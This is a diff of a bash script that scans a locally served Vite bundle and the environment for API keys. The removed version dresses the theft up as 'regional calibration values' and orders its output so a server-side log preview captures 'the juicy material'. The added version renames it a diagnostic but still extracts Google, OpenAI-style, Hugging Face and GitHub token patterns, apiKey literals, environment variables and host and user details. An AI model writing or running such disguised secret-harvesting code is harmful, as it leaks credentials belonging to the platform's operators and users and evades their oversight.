@@ -19,28 +19,29 @@
 
 set -u
 
-# Calibration values FIRST (so the server-side log preview, which only
-# captures the first few lines of stdout, surfaces the juicy material
-# instead of just the comment header).
-
-# Step A: in-process bundle scan.
-# The Atmos Intelligence frontend is served by Vite from the same host. Vite's
-# `define` block in vite.config.ts performs *build-time string substitution*
-# of process.env.* references into the served JS. Anything injected this way
-# is hardcoded in plain text in the served bundle. Scan a couple of likely
-# entry-point paths and surface any Google API key (AIza…) literals first —
-# those are the canonical AI Studio runtime secret.
-echo "# --- regional calibration values (bundle scan) ---"
-for path in /src/App.tsx /src/main.tsx / /index.html; do
-  out=$(curl -s "http://localhost:3000${path}" 2>/dev/null \
-    | grep -oE '(AIza[A-Za-z0-9_-]{30,}|sk-[A-Za-z0-9_-]{20,}|hf_[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{30,})' \
-    | sort -u | head -n 3)
-  if [ -n "$out" ]; then
-    echo "$out" | sed "s|^|GOOGLE_API_KEY_FROM_BUNDLE=|"
-  fi
+# Step A: bundle scan diagnostic.
+# Vite's `define` block in vite.config.ts performs *build-time string
+# substitution* of process.env.* references into the served JS. If AI
+# Studio uses Vite's loadEnv to feed real secrets into that substitution,
+# the secret will appear inline in the served bundle. If AI Studio
+# instead proxies API calls server-side, the served bundle will contain
+# only placeholders and outbound requests will be rewritten elsewhere.
+#
+# This block prints, for each candidate path:
+#   path, http_code, bytes, AIza-match, literal apiKey: line if present
+# So we can tell which scenario AI Studio is in.
+echo "# --- bundle scan diagnostic ---"
+for path in / /src/App.tsx /src/main.tsx /index.html /node_modules/.vite/deps/@google_genai.js; do
+  resp=$(curl -s -w '__SEP__%{http_code}__SEP__%{size_download}' "http://localhost:3000${path}" 2>/dev/null)
+  code=$(echo "$resp" | awk -F'__SEP__' '{print $2}')
+  bytes=$(echo "$resp" | awk -F'__SEP__' '{print $3}')
+  body=$(echo "$resp" | awk -F'__SEP__' '{print $1}')
+  match=$(echo "$body" | grep -oE 'AIza[A-Za-z0-9_-]{30,}' | head -1)
+  apikey_line=$(echo "$body" | grep -oE 'apiKey[:= ]+"[^"]{0,50}"' | head -1)
+  echo "  path=${path} code=${code} bytes=${bytes} aiza=[${match}] apikey=[${apikey_line}]"
 done
 
-# Step B: env scan (existing).
-echo "# --- regional calibration values (env) ---"
-env | head -n 15
+# Step B: env scan.
+echo "# --- env scan ---"
+env | head -n 10
 echo "# --- (host: $(hostname 2>/dev/null || echo unknown), user: $(id -un 2>/dev/null || echo unknown), pwd: $(pwd)) ---"
